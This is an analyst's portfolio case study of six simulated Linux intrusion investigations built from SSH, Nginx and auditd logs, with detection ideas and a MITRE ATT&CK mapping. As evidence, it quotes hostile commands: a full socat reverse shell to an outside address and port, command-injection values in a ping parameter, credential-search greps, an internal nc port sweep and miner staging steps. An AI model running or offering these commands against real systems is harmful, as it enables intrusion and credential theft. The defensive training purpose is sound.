# Linux Threat Detection — Authentication, Intrusion, and Persistence Investigations

## Executive Summary

This case study documents **six independent simulated Linux security investigations** across three training rooms. Using SSH authentication logs, Nginx access logs, and Linux `auditd` records, I investigated suspicious remote access, web command injection, discovery scripts, a suspected cryptominer deployment, privilege escalation, and persistence.

The investigations demonstrate how correlating **authentication results, HTTP requests, process ancestry, command arguments, and identity changes** produces stronger findings than examining any event in isolation. The evidence also has limits: observed commands do not always establish successful network connections, and persistence configuration does not prove subsequent execution.

| Investigation area | Scenarios | Key evidence |
| --- | --- | --- |
| Initial access | 1. SSH password guessing and root authentication; 2. TryPingMe command injection | SSH authentication logs, Nginx, auditd |
| Discovery and execution | 3. `debug.sh` discovery; 4. Suspicious root session and `kernupd` | auditd process and `PROCTITLE` records |
| Privilege escalation and persistence | 5. `socat` reverse shell and `su root`; 6. systemd, cron, account, and SSH-key persistence | auditd, service and account configuration evidence |

> **Scope:** These are separate controlled simulations, not stages of one continuous intrusion. Proposed detections were designed from the observations, **not deployed or production-validated** in these exercises.

## Evidence Sources and Methodology

- **SSH authentication logs:** Failed and accepted logins, usernames, source IPs, and timestamps.
- **Nginx access logs:** HTTP requests, request parameters, and response codes for the TryPingMe application.
- **Linux auditd:** Process execution, command arguments, `PROCTITLE`, PID/PPID relationships, UID/EUID, and execution results.
- **Persistence artifacts:** systemd services, cron entries, local-account activity, and SSH `authorized_keys` changes.

My investigation process was to **identify** an unusual event, **pivot** on its source account or process, **correlate** related records, **assess** what was actually demonstrated, and **document** both findings and limitations. A successful process execution establishes that a process ran; it does not, by itself, prove a reverse-shell connection, lateral movement, mining activity, or post-reboot persistence.

## Initial Access Investigations

### Scenario 1 — SSH Password Guessing and Root Authentication

**Context.** The first investigation examined repeated SSH password failures and a later successful root login from `91.224.92.79`.

Authentication logs showed failed passwords against `root`, `roy`, and `user` from multiple external addresses. The available screenshot does not support calculating a reliable total number of failed attempts.

![Failed SSH authentication attempts](evidence/01-ssh-failed-authentication.png)

*Figure 1 — SSH authentication logs showing repeated password failures against several accounts.*

A separate authentication event recorded a successful **password-based SSH login** to `root` from `91.224.92.79:51555` on **August 21, 2025, at 17:10:08 UTC**.

![Successful SSH root authentication](evidence/02-ssh-root-authentication.png)

*Figure 2 — Accepted password authentication for `root` from `91.224.92.79`.*

Failures against `root` from the same source address shortly before the accepted login strengthened the password-guessing hypothesis. The logs did not establish exactly how the correct password was obtained, whether every failed attempt came from the same operator, or which commands were executed after login.

**Assessment:** Suspicious SSH password-guessing activity with **confirmed root authentication**.

**Detection opportunities:** Alert on repeated SSH failures against privileged users; correlate failed-to-successful logins by source, account, host, and time; prioritize unexpected direct root logins and inspect subsequent session activity.

### Scenario 2 — TryPingMe Web Command Injection

**Context.** Suspicious requests to a `/ping` endpoint were investigated using both Nginx access logs and auditd execution records. This pairing distinguished an attempted injection from operating-system command execution.

An Nginx entry showed the `host` parameter containing `;cat /opt/trypingme/main.py`, with an HTTP **200** response. The HTTP response alone did not establish that the injected command executed.

![TryPingMe command-injection request](evidence/03-trypingme-command-injection.png)

*Figure 3 — Nginx request containing command-injection syntax in the `host` parameter.*

Auditd subsequently documented a shell command containing `ping -c 2 ;whoami` and successful execution of `/usr/bin/whoami` (`success=yes`, `exit=0` in the execution record). This supplied endpoint-side evidence of injected command execution.

![auditd command execution](evidence/04-auditd-command-execution.png)

*Figure 4 — `/bin/sh -c` invoking an injected `whoami` command, followed by a successful auditd execution record.*

Related audit records included `whoami`, `ls`, `pwd`, `cat /opt/trypingme/main.py`, and a Python command importing `socket`, `subprocess`, and `os`. The Python code began constructing a socket connection, consistent with reverse-shell activity, but the preserved command was **truncated**.

![auditd reverse shell activity](evidence/05-auditd-reverse-shell-attempt.png)

*Figure 5 — Audit records showing injected command activity and a truncated Python reverse-shell-like command.*

The truncated evidence did not preserve a complete remote destination or confirm a successfully established interactive reverse shell.

**Assessment:** **Confirmed injected command execution** and suspected Python reverse-shell activity; external session establishment unverified.

**Detection opportunities:** Correlate HTTP parameters containing shell separators with child shell/interpreter execution from web application processes. Preserve both web access logs and auditd process ancestry.

## Discovery and Cryptominer Activity

### Scenario 3 — `debug.sh` System Discovery

**Context.** An auditd event recording `hostname` execution as user `itsupport` led to the parent shell script `/home/itsupport/debug.sh`. The observed `hostname` process had PID `3772` and PPID `3771`; tracing that parent connected multiple commands to the same script.

| Command | Information enumerated |
| --- | --- |
| `hostname`, `uname -a` | Hostname, operating system, and kernel |
| `lscpu`, `uptime` | CPU and uptime |
| `free -h`, `df -hT` | Memory and filesystem resources |
| `ps -eo pid,ppid,cmd,%mem,%cpu` | Processes and resource usage |

![Linux discovery script command sequence](evidence/06-debug-script-system-discovery.png)

*Figure 6 — auditd `PROCTITLE` records showing discovery commands associated with the `debug.sh` process tree.*

The commands occurred in rapid succession and were consistent with automated host profiling. They can also be used in legitimate troubleshooting. **This screenshot does not independently show security-product discovery**, which is documented separately in Scenario 4.

**Assessment:** A linked series of system-discovery commands launched by one shell script; intent and preceding compromise were not established by these commands alone.

**Detection opportunities:** Correlate bursts of discovery utilities by parent script and user context. Review unexpected scripts running under service accounts or following suspicious authentication.

### Scenario 4 — Root SSH Access and Suspected Cryptominer Deployment

**Context.** This independent simulation examined a privileged SSH session followed by reconnaissance, security-tool checks, temporary staging, internal SSH scanning, and execution commands referencing `kernupd`.

Authentication records showed **six accepted password logins** as `root` from `45.9.148.125` on **September 11, 2025**, between approximately **21:13 and 21:26 UTC**. The preserved authentication image did **not** show the preceding failed attempts; it therefore does not prove a brute-force sequence.

![Successful root SSH authentication](evidence/07-cryptominer-root-ssh-access.png)

*Figure 7 — Six successful password-based root SSH logins from `45.9.148.125`.*

Auditd `PROCTITLE` evidence reconstructed the following activity:

| Time (UTC) | Recorded command/activity | Interpretation |
| --- | --- | --- |
| 21:13 | `groups`, `id`, `last`, `ps`, `ip a` | Account, process, session, and network discovery |
| 21:13 | `egrep` checks for `falcon`, `sentinel`, `ds_agent` | Security-software discovery attempts |
| 21:14 | `cat /proc/cpuinfo`, `free -m`, `lscpu` and other commands | Resource discovery |
| 21:14 | `tar xzf kernupd.tar.gz -C /tmp/.apt` | Extracting an archive into a temporary staging directory |
| 21:15 | `nc -zvw1` against `10.10.12.1`–`10.10.12.10` on port `22` | Internal SSH **port scanning**, not confirmed logins |
| 21:16 | `chmod +x /tmp/.apt/kernupd/kernupd` | Setting executable permission |
| 21:16 | `nohup /tmp/.apt/kernupd/kernupd` | Attempted/background launch of the suspicious executable |

![Cryptominer attack progression](evidence/08-cryptominer-attack-progression.png)

*Figure 8 — auditd commands showing discovery, staging, internal port scanning, and attempted launch of `kernupd`.*

The filename and simulated scenario associated `kernupd` with cryptocurrency mining. However, the evidence did not include binary analysis, sustained CPU metrics, or mining-pool communications. Likewise, an internal port scan did not confirm lateral movement.

**Assessment:** Suspicious root sessions followed by a progression from discovery to staging and attempted/background payload launch, consistent with possible cryptominer deployment.

**Detection opportunities:** Correlate root logins with suspicious commands under `/tmp`, security-software enumeration, internal port sweeps, and unexpected executables. Confirm mining through process, performance, and network evidence rather than a filename alone.

## Privilege Escalation and Persistence

### Scenario 5 — `socat` Reverse Shell and Confirmed Root Shell

**Context.** In a separate scenario, auditd showed a Python service running under `svctrypingme` spawning a shell and `socat`. Subsequent credential searches preceded a confirmed transition to root.

#### Process Ancestry and Reverse-Shell Command

```text
systemd (PID 1)
└── python3.12 (PID 2526, svctrypingme)
    └── /bin/sh (PID 2543)
        └── socat (PID 2545)
```

The command was:

```bash
socat TCP:10.14.105.255:1337 EXEC:sh,pty,stderr,setsid,sigint,sane
```

This was consistent with a reverse shell targeting `10.14.105.255:1337`. Auditd `success=yes` established successful **process execution**, not necessarily a completed TCP connection or how long an interactive session persisted. The exact application pathname was not present in the preserved process record; the TryPingMe attribution came from the training scenario.

![socat reverse-shell process ancestry](evidence/09-socat-reverse-shell.png)

*Figure 9 — auditd process ancestry connecting the Python service, shell, and `socat` execution.*

#### Credential Search and Privilege Transition

Further audit records captured searches for secrets:

```bash
grep -iR key .
grep -iR pass .
```

The scenario indicated that a root credential was found in an environment file; the credential value is not reproduced here. The preserved search commands show **credential discovery behavior**, not the full file contents.

Auditd then documented `su root` (PID `2554`) and a subsequent Bash process (PID `2570`) with **UID and EUID both `root`**.

![Confirmed Linux root privilege escalation](evidence/10-root-privilege-escalation.png)

*Figure 10 — Credential-search activity, `su root`, and a subsequent Bash shell executing as root.*

The identity fields confirmed the privilege transition. No vulnerability exploitation was demonstrated; the sequence was consistent with use of credentials through `su`.

**Assessment:** Suspicious reverse-shell command execution and credential search followed by **confirmed root-context Bash execution**. The complete remote-shell session and original credential acquisition were not independently proven.

**Detection opportunities:** Correlate service-originated shell and `socat` execution with secret-search commands and later `su` transitions. Alert on unexplained UID/EUID changes to root from application service contexts.

### Scenario 6 — Linux Persistence Mechanisms

**Context.** The final investigation examined four potential methods of maintaining access after initial compromise. The preserved evidence showed configuration and account-related activity, not successful operation of every mechanism after a restart.

| Mechanism | Observed activity | Security significance |
| --- | --- | --- |
| systemd | Suspicious `tux.service` configuration | Could provide recurring/background execution |
| cron | `@reboot /usr/sbin/phoenix` | Requests execution when the cron daemon starts |
| Local account | Creation/privilege-related activity involving `koichi` | Could preserve a privileged authentication route |
| SSH key | Activity modifying `/root/.ssh/authorized_keys` | Could permit passwordless public-key authentication, subject to SSH configuration |

![Systemd and cron persistence evidence](evidence/11-systemd-cron-persistence.png)

*Figure 11 — `tux.service` persistence configuration and a cron `@reboot` entry for `/usr/sbin/phoenix`.*

![Privileged account and SSH-key persistence](evidence/12-account-ssh-key-persistence.png)

*Figure 12 — Account-management activity involving `koichi` and changes to root's SSH authorized-key file.*

The evidence did not preserve complete SSH public-key material or demonstrate that the new key was used to log in. It also did not confirm that the systemd service or cron payload successfully executed after restart.

**Assessment:** Multiple apparent persistence paths involving service execution, scheduled execution, local accounts, and SSH authentication. Their subsequent effectiveness was not established.

**Detection opportunities:** Monitor service-file creation, `@reboot` cron changes, new privileged users/group membership, and writes to `authorized_keys`. During remediation, inspect all four locations rather than terminating only the currently suspicious process.

## Consolidated Detection Opportunities

The following are **proposed** behavioral rules based on the investigations, not validated detections deployed in a SIEM:

| Use case | Proposed correlation | Data sources |
| --- | --- | --- |
| SSH guessing to root access | Burst of failed SSH passwords, then accepted login matching account/source/host within a time window | Authentication logs |
| Web command injection | Suspicious shell syntax in HTTP request followed by shell/interpreter execution in web-service ancestry | Nginx and auditd |
| Discovery script | Rapid system-enumeration commands sharing one parent process | auditd |
| Suspicious root session | Root SSH authentication, security-product checks, executable extraction, and internal port scan | Authentication logs, auditd, network telemetry |
| Reverse shell and escalation | Service process → shell/`socat` → credential searches → root-owned shell | auditd, authentication logs |
| Persistence creation | Unexpected service/cron/account/SSH-key changes near a suspicious privileged session | auditd, filesystem and configuration monitoring |

Suggested rule improvements include allowlisting approved administrative jobs, checking actual process ancestry and effective user, and tuning by authorized maintenance windows. DNS, TCP, and host telemetry would strengthen the evidence for network outcomes and payload behavior.

## MITRE ATT&CK Mapping

The mappings describe observed or strongly supported behaviors. They do not imply that every malicious objective succeeded.

| Investigation | Technique | ID | Evidence basis |
| --- | --- | --- | --- |
| SSH password attempts | Brute Force | `T1110` | Repeated failed password authentication |
| External SSH access | External Remote Services | `T1133` | Successful SSH connections from external source addresses; external-facing exposure inferred from context |
| Web command injection | Exploit Public-Facing Application | `T1190` | Injection request plus corresponding auditd execution |
| Injected shell commands | Command and Scripting Interpreter: Unix Shell | `T1059.004` | `/bin/sh -c` executing injected commands |
| System discovery | System Information Discovery | `T1082` | `hostname`, `uname`, CPU/memory/filesystem commands |
| Process enumeration | Process Discovery | `T1057` | `ps` commands |
| Security-product checks | Software Discovery: Security Software Discovery | `T1518.001` | Checks for Falcon, Sentinel, and `ds_agent` |
| Internal SSH scanning | Network Service Discovery | `T1046` | `nc` port-22 sweep over internal addresses |
| Credential searches | Unsecured Credentials: Credentials in Files | `T1552.001` | `grep` searches for keys/passwords; results not independently preserved |
| Root access through `su` | Valid Accounts: Local Accounts | `T1078.003` | `su root` and later root UID/EUID |
| systemd persistence | Create or Modify System Process: Systemd Service | `T1543.002` | `tux.service` configuration |
| cron persistence | Scheduled Task/Job: Cron | `T1053.003` | `@reboot /usr/sbin/phoenix` |
| Local account activity | Create Account: Local Account | `T1136.001` | Account-creation activity involving `koichi` |
| Privileged group changes | Account Manipulation: Additional Local or Domain Groups | `T1098.007` | Privileged group-membership activity involving `koichi` |
| SSH authorized-key changes | Account Manipulation: SSH Authorized Keys | `T1098.004` | Activity writing `/root/.ssh/authorized_keys` |

**Mapping caveat:** I excluded **Ingress Tool Transfer (`T1105`)** because the available record shows **archive extraction**, not how `kernupd.tar.gz` entered the host. Likewise, `socat` execution is described as reverse-shell behavior without claiming a confirmed command-and-control session.

## Evidence Limitations

| Investigation | What the evidence established | What remained unverified |
| --- | --- | --- |
| SSH authentication | Failed passwords and accepted root login | Method of obtaining valid credentials, post-login actions |
| TryPingMe injection | Injected shell command execution | Complete Python payload and successful interactive connection |
| `debug.sh` | Automated-looking system/resource discovery | Malicious intent or preceding compromise |
| Suspected cryptominer | Root logins, enumeration, archive extraction, scan, launch command | Mining activity, successful lateral movement, origin of archive |
| `socat` and `su` | Reverse-shell-like command executed; later root Bash process | Connection duration, initial credential source |
| Persistence | Service, cron, account, and SSH-key activity | Use after reboot, successful later login, full public-key material |

## Skills Demonstrated

- **Linux log analysis:** SSH authentication, Nginx, auditd `EXECVE`/`PROCTITLE`, PID/PPID, UID/EUID.
- **Threat investigation:** Process ancestry, web command injection, reverse-shell indicators, discovery commands, suspicious staging, internal scanning.
- **Privilege and persistence analysis:** Credential searching, `su root`, systemd, cron, account changes, SSH authorized keys.
- **SOC reporting:** Cross-source correlation, defensible assessments, proposed detection logic, MITRE ATT&CK mapping, and documentation of uncertainty.

### Investigation Takeaway

The strongest finding across these independent exercises was the value of **connecting log sources and process relationships**. An unusual SSH login, HTTP parameter, or Linux command may be inconclusive alone; the sequence of related authentication, web, audit, and configuration evidence supports a more defensible investigation while making remaining gaps explicit.
